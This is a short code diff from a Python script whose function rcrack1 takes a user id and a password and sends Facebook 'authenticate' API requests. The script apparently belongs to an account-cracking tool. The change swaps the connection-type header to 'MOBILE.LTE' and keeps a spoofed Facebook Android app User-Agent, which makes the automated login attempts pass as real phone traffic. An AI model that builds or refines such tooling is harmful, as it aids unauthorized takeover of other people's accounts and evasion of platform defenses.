@@ -256,10 +256,10 @@ def rcrack1(uid,pwx,tl):
                                 'generate_machine_id':'1',
                                 'fb_api_req_friendly_name':'authenticate',
                         }
-               headers={
+                        headers={
                                 'Authorization':f'OAuth {accessToken}',
                                 'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
+                                'X-FB-Connection-Type': 'MOBILE.LTE',
                                 'User-Agent':'[FBAN/FB4A;FBAV/130.69.0.54;FBBV/25236333;FBDM/{density=3.8,width=1421,height=1497};FBLC/en_GB;FBRV/14998782;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/5.8;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
                                 'Accept-Encoding':'gzip, deflate',
                                 'Content-Type': 'application/x-www-form-urlencoded',
